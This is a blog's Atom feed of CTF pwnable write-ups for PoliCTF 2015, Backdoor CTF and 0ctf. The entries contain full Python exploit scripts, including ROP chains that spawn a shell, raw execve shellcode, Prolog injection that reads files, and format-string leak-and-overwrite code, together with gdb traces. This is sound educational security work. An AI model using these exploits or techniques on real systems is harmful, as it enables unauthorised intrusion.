<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Pwnable | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/pwnable/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-07-25T22:02:43+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John's Shuffle]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle/"/>
    <updated>2015-07-12T17:06:29+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle</id>
    <content type="html"><![CDATA[<p>John&rsquo;s Shuffle was a 350 point pwnable for PoliCTF 2015. Here&rsquo;s how I cracked it!</p>

<!--more-->


<p>Again, it&rsquo;s a 32 bit ELF binary. Running it yields the following:</p>

<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-shuffle$ ./johns-shuffle 
It all began as a mistake..


It all began as a mistake..


It all began as a mistake..
</code></pre>

<p>Not very useful. The disassembly provided some hints, for it had functions like <code>shuffle</code>, <code>unshuffle</code> and <code>bubblesort</code>. The program kicks off by clearing a lot of stack space and calling <code>unshuffle</code>. Then, it asks for user input, maximum size 0x44 bytes. I decided to enter 0x44 * <code>A</code> (what else?).</p>

<pre><code>    ... clear stack space ...
 8048f30: call   8048df0 &lt;unshuffle&gt;
 8048f35: mov    DWORD PTR [esp],0x804b078
 8048f3c: call   8048710 &lt;puts@plt&gt;
 8048f41: mov    eax,ds:0x804b0c0
 8048f46: mov    DWORD PTR [esp],eax
 8048f49: call   80486c0 &lt;fflush@plt&gt;
 8048f4e: mov    eax,ds:0x804b0a0
 8048f53: mov    DWORD PTR [esp+0x8],eax
 8048f57: mov    DWORD PTR [esp+0x4],0x44
 8048f5f: lea    eax,[esp+0x2c]
 8048f63: mov    DWORD PTR [esp],eax
 8048f66: call   80486e0 &lt;fgets@plt&gt;
</code></pre>

<p>When runnning the <code>shuffle</code> function, the program executes <code>system()</code>, which spawns <code>/bin/dash</code> on my system, effectively stopping me from debugging it in <code>gdb</code>. I patched system in gdb so it would return immediately and I could trace the program. Turns out <code>shuffle</code> takes the GOT entries, all the function pointers, and shuffles them around. <code>unshuffle</code> negates this operation. After the second time I entered 0x44 A&rsquo;s, the program crashed with control over EIP and EBP:</p>

<pre><code>gdb-peda$ start
Temporary breakpoint 2, 0x08048ec2 in main ()
gdb-peda$ p system
$2 = {&lt;text variable, no debug info&gt;} 0xf7e9ac30 &lt;system&gt;
gdb-peda$ set *0xf7e9ac30=0xc3
gdb-peda$ c
It all began as a mistake..
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

It all began as a mistake..

It all began as a mistake..
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xf7fbeff4 --&gt; 0x15fd7c 
ECX: 0x4 
EDX: 0x80487a6 (&lt;difftime@plt+6&gt;:   push   0x88)
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd5c0 ('A' &lt;repeats 31 times&gt;)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd5c0 ('A' &lt;repeats 31 times&gt;)
0004| 0xffffd5c4 ('A' &lt;repeats 27 times&gt;)
0008| 0xffffd5c8 ('A' &lt;repeats 23 times&gt;)
0012| 0xffffd5cc ('A' &lt;repeats 19 times&gt;)
0016| 0xffffd5d0 ('A' &lt;repeats 15 times&gt;)
0020| 0xffffd5d4 ('A' &lt;repeats 11 times&gt;)
0024| 0xffffd5d8 ("AAAAAAA")
0028| 0xffffd5dc --&gt; 0x414141 ('AAA')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 
</code></pre>

<p>Cool, easy control over EIP. However, at this point, we cannot rely on the GOT entries, because they are still shuffled! We can&rsquo;t just ret2system. I spent some time trying to return to <code>unshuffle</code>, but kept losing control of the program execution.</p>

<p>But let&rsquo;s take a step back here. Linux ELF binaries employ something called &ldquo;lazy linking&rdquo;. When a binary is started, the symbols are not resolved yet. Only when a function is called for the first time will the function address be resolved. The GOT entry will be pointing to this look up code (memcpy as example):</p>

<pre><code>080486d0 &lt;memcpy@plt&gt;:
 80486d0:   ff 25 1c b0 04 08       jmp    DWORD PTR ds:0x804b01c 
 80486d6:   68 20 00 00 00          push   0x20
 80486db:   e9 a0 ff ff ff          jmp    8048680 &lt;_init+0x2c&gt;
</code></pre>

<p>When called for the first time, <code>0x804b01c</code> will be pointing to <code>0x80486d6</code>, which will kick off the function resolver. So instead of using <code>0x80486d0</code> to do a memcpy, I&rsquo;d just use <code>0x80486d6</code>. This bypasses the mess that <code>shuffle</code> made!</p>

<p>With all this in hand, I wrote an exploit and the corresponding rop chain (well&hellip; more like ret2resolve ;)).</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('shuffle.polictf.it', 80))

    readtil('mistake..')

    rop = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    rop += p(0x8048696) # resolve -&gt; read (so we can read in `/bin/sh`)
    rop += p(0x804901d) # pppr
    rop += p(0)         # stdin
    rop += p(0x804b130) # free mem area
    rop += p(0x10)
    rop += p(0x8048726) # resolve -&gt; system
    rop += p(0x8048746) # resolve -&gt; exit (makes rasta_mouse happy!)
    rop += p(0x804b130) # arg for system; will contain /bin/sh in a few moments

    sendln(rop)

    readtil('mistake..')
    sendln(rop)
    readtil('mistake..')
    sendln(rop)

    sendln('/bin/sh')
    t = telnetlib.Telnet()
    t.sock = s

    t.interact()

    s.close()

pwn()
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-shuffle$ python poc.py 

id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
cat /home/ctf/*
flag{rand0mizing_things_with_l0ve}
cat: /home/ctf/johnshuffle: Permission denied
</code></pre>

<p>Easy peasy! The flag was <code>flag{rand0mizing_things_with_l0ve}</code>. Nice!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John's Library]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library/"/>
    <updated>2015-07-12T16:45:04+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library</id>
    <content type="html"><![CDATA[<p>Finally, pwnables! John&rsquo;s Library was worth 150 points. I was a bit rusty but I managed to grab this flag.</p>

<!--more-->


<p>We&rsquo;re given a 32 bit Linux ELF. Upon running it, we&rsquo;re presented with a library menu, where we can view titles, add them and exit the program:</p>

<pre><code class="bash">Welcome to the jungle library mate! Try to escape!!

 r - read from library
 a - add element
 u - exit
a
Hey mate! Insert how long is the book title: 
10000
Hey you! what are you trying to do??
</code></pre>

<p>So we can&rsquo;t really add long titles. Upon inspection, Swappage and I noticed that the titles are stored on the stack, with the lengths in a special data structure in the <code>.data</code> of the binary:</p>

<pre><code> 8048731: mov    eax,DWORD PTR [eax*4+0x804a060] ; 0x804a060 contains lengths
 8048738: mov    edx,eax
 804873a: mov    eax,DWORD PTR [ebp+0x8]         ; ptr to first book
 804873d: add    eax,edx                         ; add length of last string to it
 804873f: mov    DWORD PTR [esp],eax
 8048742: call   8048410 &lt;gets@plt&gt;              ; grab book title
</code></pre>

<p>I noticed I could bypass the length check with a large number, effectively utilizing a signedness bug. This allowed us to overwrite the return address of <code>main()</code> on the stack. Although NX wasn&rsquo;t enabled, ASLR was enabled so we couldn&rsquo;t just jump to the shellcode on the stack. There weren&rsquo;t enough gadgets for a ROP chain. Instead, we needed to leak a stack address so we could return to the shellcode on the stack (bruteforcing it didn&rsquo;t work). That&rsquo;s where the read function came into play.</p>

<p>Looking up a book title via the read function was done like this:</p>

<pre><code> 8048678: mov    eax,DWORD PTR [ebp-0xc]         ; number we just submitted
 804867b: mov    eax,DWORD PTR [eax*4+0x804a060] ; grab length of that book title
 8048682: mov    edx,eax
 8048684: mov    eax,DWORD PTR [ebp+0x8]         ; pointer to book titles on stack
 8048687: add    eax,edx                         ; add length of string so eax points to book title 
 8048689: mov    DWORD PTR [esp+0x4],eax
 804868d: mov    DWORD PTR [esp],0x8048893
 8048694: call   80483f0 &lt;printf@plt&gt;            ; dump title to user
</code></pre>

<p>By passing in a negative number, I was able to make <code>804867b: mov eax,DWORD PTR [eax*4+0x804a060]</code> point to <code>0x80493fc</code>, which contained <code>0xffffffe0</code>. Therefore, when this value is added to the pointer to the book titles, it actually is moved backwards and starts leaking stack addresses:</p>

<pre><code>0xffffd1ab (address of book titles on stack) + 0xffffffe0 =&gt; 
gdb-peda$ x/10x $eax
0xffffd18b: 0x048614-&gt;ff    0xffd1ab&lt;-08    0x000002ff  0x15fd7c00
0xffffd19b: 0x15fd7c00  0x15fd7c00  0x0000f000  0x0000f000
</code></pre>

<p>I now had a way to leak the book title buffer on the stack, where we could store shellcode in a book title. By exploiting the signedness bug, we could overwrite the return address of <code>main()</code>. After setting all of this up, we&rsquo;d ask the binary to exit and make it return to our shellcode. Putting it all together:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('library.polictf.it', 80))

    readtil('exit')

    # mem leak
    sendln('r')
    readtil('read:')
    sendln('-793')  
    # -793*4 = 0xfffff39c; 
    # 0x804867b &lt;read_from_library+58&gt;: mov eax,DWORD PTR [eax*4+0x804a060] 
    # -&gt; 0x80493fc == 0xffffffe0

    # leak stack addr
    time.sleep(0.1)
    buf = s.recv(20)
    stackaddr = struct.unpack('&lt;L', buf[6:10])[0]
    print hex(stackaddr+100)
    readtil('exit')

    sendln('a')
    readtil('title:')
    sendln('1')
    sendln('b')

    readtil('exit')

    sendln('a')
    readtil('title:')
    # 2**32 -&gt; integer overflow, 
    # we now have plenty of space to overwrite the saved return address
    sendln('4294967296') 

    # the reason i divided the nop sled is simple; for some reason, when the shellcode executes, 
    # it overwrites itself if it's at the end. this solves it; didn't debug it 
    sendln("\x90"*(0x30f-37)+"\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcc\x80"+"A"*0x100+p(stackaddr+200)) # 0xffffd1ad -&gt; start of our buffer

    readtil('exit')
    sendln('u')

    t = telnetlib.Telnet()
    t.sock = s

    t.interact()

    s.close()

pwn()
</code></pre>

<p>And running it:</p>

<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-library$ python sn0w.py 

id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
cd /home/ctf
ls
challenge
flag
cat flag
flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}
</code></pre>

<p>The flag was <code>flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - Hanoi as a Service]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service/"/>
    <updated>2015-07-12T16:30:31+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service</id>
    <content type="html"><![CDATA[<p>Hanoi As A Service was a 50 point pwnable in PoliCTF and gave me a reason to hate PROLOG.</p>

<!--more-->


<p>We&rsquo;re given <code>nc haas.polictf.it 80</code> as point of attack. Let&rsquo;s start:</p>

<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?

ERROR: Prolog initialisation failed:
ERROR: Syntax error: Unexpected end of clause
ERROR: hanoi() 
ERROR: ** here **
ERROR: .
</code></pre>

<p>Interesting. I now know I&rsquo;m up against some Prolog program. Let&rsquo;s see if we can inject Prolog code:</p>

<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), hanoi(2). 
* Move top disk from a to c
* Move top disk from a to b
* Move top disk from c to b
</code></pre>

<p>Looks like we can! Now, since I never learned Prolog as a kid (I&rsquo;m more of a BASIC boy), I searched around for code examples. I couldn&rsquo;t just grab the flag so I started with enumerating.</p>

<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), expand_file_name('/home/*', S), write(S). 
[/home/ctf,/home/ubuntu]

# enumerate /home/ctf:

bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), expand_file_name('/home/ctf/*', S), write(S). %
[/home/ctf/haas]bas@tritonal:~$ 

# enumerate /home/ctf/haas:

bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), expand_file_name('/home/ctf/haas/*', S), write(S).  
[/home/ctf/haas/haas,/home/ctf/haas/haas-proxy.py,/home/ctf/haas/jhknsjdfhef_flag_here]
</code></pre>

<p>I now had the location of the flag. Now, to read it&hellip; Turns out Prolog does not have a &ldquo;normal&rdquo; way to read arbitrary files (it expects Prolog terms or something). I searched for a good while and finally:</p>

<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), open('/home/ctf/haas/jhknsjdfhef_flag_here', read, S), read_line_to_codes(S, T), write(T). 
[102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
</code></pre>

<p>Back to python!</p>

<pre><code class="python">&gt;&gt;&gt; a = [102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
&gt;&gt;&gt; print "".join([chr(x) for x in a])
flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
</code></pre>

<p>50 points and first blood for Team Vulnhub.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - Team]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team/"/>
    <updated>2015-04-02T19:23:27+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team</id>
    <content type="html"><![CDATA[<p>Backdoor CTF was hosted on a weekday, so we only had the evening to grab as many flags as we could. Here&rsquo;s how we solved <code>team</code> for 600 points.</p>

<!-- more -->


<p>The binary we&rsquo;ve been given is a 32-bit ELF. The output of strings doesn&rsquo;t give us much. Using <code>strace ./team</code>, it becomes clear that the binary reads from <code>flag.txt</code> so I created one locally. I echoed <code>flag1</code> to the file and restarted the binary.</p>

<p>It asks for a team name and a flag. After receiving these values in heap buffers (non-overflowable as far as I could gather) it proceeds to read the flag from <code>flag.txt</code>. Then, it compares the user input to the flag using <code>strcmp</code>.</p>

<p>The team name is then printed using <code>printf</code>: this is vulnerable to a format string vulnerability:</p>

<pre><code>bas@tritonal:~/tmp/bckdr/team-600$ ./team
Enter teamname: TEAM%llp
Enter flag: FLAG%llp
TEAM0x64 : incorrect flag. Try again.
</code></pre>

<p>Okay, so let&rsquo;s have a look at the stack when we reach <code>printf</code>. It gets called at <code>8048711</code> to print the team name.</p>

<pre><code>Breakpoint 1, 0x08048711 in ?? ()
gdb-peda$ x/40wx $esp
0xffffd510: 0x0804b008  0x00000064  0x0804b140  0x00000000
0xffffd520: 0x00000000  0x00000000  0x0804b0d8  0x0804b008
0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
0xffffd540: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd550: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd560: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd570: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd580: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd590: 0x00000000  0x00000002  0x00000000  0x856b7a00
0xffffd5a0: 0x00000000  0x00000000  0xffffd5d8  0x0804880c
</code></pre>

<p>What&rsquo;s this then? From breakpointing <code>strcmp</code>, I learned that the flag was on the stack. In fact, it&rsquo;s within reach of the format string vulnerability!</p>

<pre><code>0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
                          flag1 &gt;&gt;&gt;   g a l f           1
</code></pre>

<p>That&rsquo;s too easy, right? Wrong! The flag starts at <code>%10$p</code>:</p>

<pre><code class="bash">bas@tritonal:~/tmp/bckdr/team-600$ ./team
Enter teamname: %10$p
Enter flag: bleh
0x67616c66 : incorrect flag. Try again.
</code></pre>

<p>It worked remotely with this script:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn(n):
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('hack.bckdr.in', 8004))

    readtil('teamname: ')
    sendln("AAAA%"+str(n)+"$p")
    readtil('flag: ')
    sendln("CTF_TEAM_VULNHUB")
    data = readtil('again.')

    s.close()
    m = re.findall(r'0x([0-9a-f]*) :', data)
    return m[0]

full = ''
for i in xrange(10, 30):
    full += pwn(i).decode('hex')[::-1]
    print full
</code></pre>

<p>This spits out the flag until it hits something it can&rsquo;t hex decode. Because the CTF is long-lived, we won&rsquo;t post any flags.</p>

<p>Far too easy for a 600 point challenge, but we&rsquo;re not complaining&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[0ctf - Login]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-login/"/>
    <updated>2015-03-30T20:17:23+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-login</id>
    <content type="html"><![CDATA[<p>The second pwnable I solved for <code>0ctf</code> on behalf of CTF-Team VulnHub! This one contained My Favorite Vulnerability, guess which one?</p>

<!-- more -->


<p><code>login</code> was a 64-bit ELF. Quickly checking what I was up against with <code>gdb-peda</code>:</p>

<pre><code class="bash">gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
</code></pre>

<p>Oops. This looks like fun! The description said to login as guest, and login as root. Together with the output of <code>strings</code>, this allowed me to bypass the first login:</p>

<pre><code class="bash">Login: guest
Password: guest123
== 0CTF Login System ==
1. Show Profile
2. Login as User
3. Logout
=======================
Your choice: 1
Username: guest
Level: Guest
</code></pre>

<p>Now, we&rsquo;re presented with three choices. With <code>2</code>, we can change our username and view it with <code>1</code>. However, this was not vulnerable to overflows or format string vulnerabilities. I dug into the menu system, looking for hidden things, and indeed:</p>

<pre><code>;;; print_menu and get_choice
1265: call   ddd &lt;open@plt+0x24d&gt;   
126a: mov    DWORD PTR [rbp-0x4],eax
126d: mov    eax,DWORD PTR [rbp-0x4]
1270: cmp    eax,0x2
1273: je     1299 &lt;open@plt+0x709&gt;
1275: cmp    eax,0x2
1278: jg     1281 &lt;open@plt+0x6f1&gt;
127a: cmp    eax,0x1
127d: je     128d &lt;open@plt+0x6fd&gt;
127f: jmp    12e3 &lt;open@plt+0x753&gt;
1281: cmp    eax,0x3
1284: je     12a5 &lt;open@plt+0x715&gt;
1286: cmp    eax,0x4                ; AHA! Secret entry
1289: je     12b8 &lt;open@plt+0x728&gt;  ; Jump to 12b8
128b: jmp    12e3 &lt;open@plt+0x753&gt;
128d: mov    eax,0x0
1292: call   f24 &lt;open@plt+0x394&gt;
1297: jmp    12f0 &lt;open@plt+0x760&gt;
1299: mov    eax,0x0
129e: call   f7a &lt;open@plt+0x3ea&gt;
12a3: jmp    12f0 &lt;open@plt+0x760&gt;
12a5: lea    rdi,[rip+0x246]        # 14f2 &lt;open@plt+0x962&gt;
12ac: call   a90 &lt;puts@plt&gt;
12b1: mov    eax,0x0
12b6: jmp    12f5 &lt;open@plt+0x765&gt;

;;; choice 4
12b8: lea    rax,[rip+0x200d81]     ; rax points to our provided username (e.g. 'root')
12bf: mov    eax,DWORD PTR [rax+0x100]  ; check this flag... starts off as 0x1
12c5: test   eax,eax
12c7: jne    12d5 &lt;open@plt+0x745&gt;
</code></pre>

<p>So we need to bypass this secret menu and make sure that the flag is set to <code>0x00</code>. As I said, <code>rax</code> points to our input, and the flag comes 256 bytes after that. It starts out as 1 and we need to make it zero&hellip; we&rsquo;re looking for an off-by-one! This is present in the <code>input username</code> function, allowing the reset of the flag and entering the secret login menu:</p>

<pre><code>Login: guest
Password: guest123
== 0CTF Login System ==
1. Show Profile
2. Login as User
3. Logout
=======================
Your choice: 2
Enter your new username:
HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
Done.
== 0CTF Login System ==
1. Show Profile
2. Login as User
3. Logout
=======================
Your choice: 4
Login: root
Password: toor
root login failed.
1 chance remaining.
Login: %llp
Password: bleh
0x7f13e2689490 login failed.
Threat detected. System shutdown.
</code></pre>

<p>I won&rsquo;t show the disassembly, but just describe what happens. Locally, the binary takes the md5 of our supplied password, but compares it to <code>0ops{secret_md5}</code>. If it matches, it calls a function to dump the flag. I figured the remote binary would contain the real md5, so I needed a way to read from the process remotely. The vulnerability to do so was found soon enough, it&rsquo;s a format string vulnerability. We get two chances. I used the first to leak a stack address and an address of the binary (because of PIE, it&rsquo;s loaded at a different address each time). The second printf call is then used to leak the md5 to which our supplied password is compared.</p>

<p>Easy, right? Wrong. The remote binary returned the same string, <code>0ops{secret_md5}</code>. Obviously, I had to find another way to break this binary.</p>

<h2>The Nitty Gritty</h2>

<p>I tried overwriting a GOT pointer with the format string vulnerability, but failed: the GOT section was marked read-only! I looked for other ways to gain control of execution or making the <code>memcmp</code> succeed, but could only come up with one thing: overwriting the saved return address of the second printf call.</p>

<pre><code>11d9: lea    rsi,[rip+0x2b5]       ; 'secret_MD5' --&gt; same remotely :?
11e0: mov    rdi,rax
11e3: call   b70 &lt;memcmp@plt&gt;
11e8: test   eax,eax
11ea: jne    11f8 &lt;open@plt+0x668&gt;
11ec: mov    eax,0x0
11f1: call   fb3 &lt;open@plt+0x423&gt;
11f6: jmp    122e &lt;open@plt+0x69e&gt;
11f8: lea    rax,[rbp-0x210]
11ff: mov    rdi,rax
1202: mov    eax,0x0
1207: call   a70 &lt;printf@plt&gt;      ; second printf call; overwrite saved ret addr using format string vuln
120c: lea    rdi,[rip+0x293]        # 14a6 &lt;open@plt+0x916&gt;
1213: call   a90 &lt;puts@plt&gt;
1218: lea    rdi,[rip+0x2b1]        # 14d0 &lt;open@plt+0x940&gt;
121f: call   a90 &lt;puts@plt&gt;
1224: mov    edi,0x1
1229: call   aa0 &lt;exit@plt&gt;
</code></pre>

<p>I found a nice, stable stack pointer that I could leak, calculated the offset to the location of the saved return address and plugged it in a poc script. Locally, it gave me the flag! I quickly tried it remotely, but it failed miserably. Turns out the layout of the stack was different; the leaked stack pointer was at a different location. Furthermore, the offset from other leaked stack addresses to the saved return address of the second printf was different. Back to the drawing board?</p>

<h2>Some luck involved</h2>

<p>I spent some time trying to locate other stack addresses that I could leak and gave me a nice, stable way to calculate the location of the saved return address. I had a way to leak the binary address, meaning I could calculate the exact return address. I then started brute-forcing stack pointers and using the second printf to dump the memory from the stack. Using this, I was looking for the correct return address. Because I was fed up with it and it was late, I had forgotten to remove a certain constant from the poc that I used locally.</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys

def readtil(delim):
    buf = b''
    while not e in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def q(x):
    return struct.pack('&lt;Q', x)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('localhost', 6666))
    s.connect(('202.112.26.107', 10910))

    raw_input()

    readtil('Login: ')
    sendln('guest')
    readtil('Password: ')
    sendln('guest123')
    readtil('choice: ')
    sendln('2')
    readtil('username:')
    sendln("A"*256)     # overflow userflag
    readtil('choice: ')
    sendln('4')         # secret login menu

    ### first format string vuln to read stack addr
    readtil('Login: ')
    # leak both binary address and stack address
    sendln('%1$lp-%'+sys.argv[1]+'$lp')
    readtil('Password: ')
    sendln('bleh')
    data = readtil('login failed.')

    m = re.findall(r'([a-f0-9]{5,})', data)
    # find stack addr:
    stack_addr = int(m[1], 16) 
    base_addr = int(m[0], 16) - 0x1490

    print "[+] Leaked address of base: {}".format(hex(base_addr))
    print "[+] Leaked address of stack: {}".format(hex(stack_addr))

    readtil('Login: ')

    sendln('AAAAAAABBBC%10$s'+q(stack_addr-504))    # this offset of 504 was found locally and seems to be correct for remote, too

    readtil('Password: ')
    sendln('bleh')
    data = s.recv(1000)
    print data 
    print hex(struct.unpack('&lt;Q', data[len('AAAAAAABBBC'):len('AAAAAAABBBC')+6]+b"\x00\x00")[0])
    print "you're looking for {}".format(hex(base_addr + 0x120c))

    # check if the stack location contains the right return address
    if (struct.unpack('&lt;Q', data[len('AAAAAAABBBC'):len('AAAAAAABBBC')+6]+b"\x00\x00")[0]) == (base_addr + 0x120c):
        print "Found at {}".format(sys.argv[1])
        raw_input()

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

    s.close()

pwn()
</code></pre>

<p>Note: the exact layout of the format string is chosen such that the stack address is overlapping with an actuall address on the stack. Because we can&rsquo;t send null-bytes, if we overwrite something else, the pointer would be mangled:</p>

<pre><code>before: 0xdeadbeef 0xcafebabe
after:  0x504ddb66 0x7fff00be -&gt; stack address is invalid, pointing to 0xbe007fff....

should be:

before: 0xdeadbeef 0xcafe0000
after:  0x504ddb66 0x7fff0000 -&gt; properly set stack address
</code></pre>

<p>Locally, I identified both the arguments 15 and 41 (in the first format string vuln) to contain the right stack address. Remotely, these contained something different. However, I simply increased the number until I hit 43: this address, combined with the offset, contained the return address! I definitely lucked out after banging my head against the challenge for a few hours.</p>

<h2>Hitting the jackpot</h2>

<pre><code class="bash">$ python poc.py 43

[+] Leaked address of base: 0x7f48589d5000
[+] Leaked address of stack: 0x7fffb65656b0
[+] Offset format string with 24497 bytes
AAAAAAABBBC
           b.XH..TV...
0x7f48589d620c
you're looking for 0x7f48589d620c
Found at 43
</code></pre>

<p>Armed with the correct stack address, I could now trivially overwrite two bytes of the saved return address so that it points to the function that read the flag and dumps it over the socket:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def q(x):
    return struct.pack('&lt;Q', x)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('localhost', 6666))
    s.connect(('202.112.26.107', 10910))

    #raw_input()

    readtil('Login: ')
    sendln('guest')
    readtil('Password: ')
    sendln('guest123')
    readtil('choice: ')
    sendln('2')
    readtil('username:')
    sendln("A"*256)     # overflow userflag
    readtil('choice: ')
    sendln('4')         # secret login menu


    ### first string format vuln to read stack addr
    readtil('Login: ')
    # 43 found by lucky bruteforcing in combination with the 504 below. locally, it's at 15 and 41
    sendln('%1$lp-%43$lp')
    readtil('Password: ')
    sendln('bleh')
    data = readtil('login failed.')

    m = re.findall(r'([a-f0-9]{5,})', data)
    # find stack addr:
    stack_addr = int(m[1], 16) 
    base_addr = int(m[0], 16) - 0x1490

    # base_addr was not necesssary in the final exploit, but was 
    # instrumental in finding the right offset!
    print "[+] Leaked address of base: {}".format(hex(base_addr))
    print "[+] Leaked address of stack: {}".format(hex(stack_addr))

    readtil('Login: ')

    # we need to return to base_addr + 0xfb3, because that function 
    # is designed to read the flag &amp; spit it over the socket
    print_offset = (base_addr &amp; 0xffff) + 0xfb3 - 2

    print "[+] Offset format string with {} bytes".format(print_offset)

    # send format string to overwrite saved return addr of 
    sendln('%' + "%05d" % print_offset +'c___%10$hn'+q(stack_addr-504)) # should point to ret_addr at stack

    readtil('Password: ')
    sendln('bleh')

    t = telnetlib.Telnet()
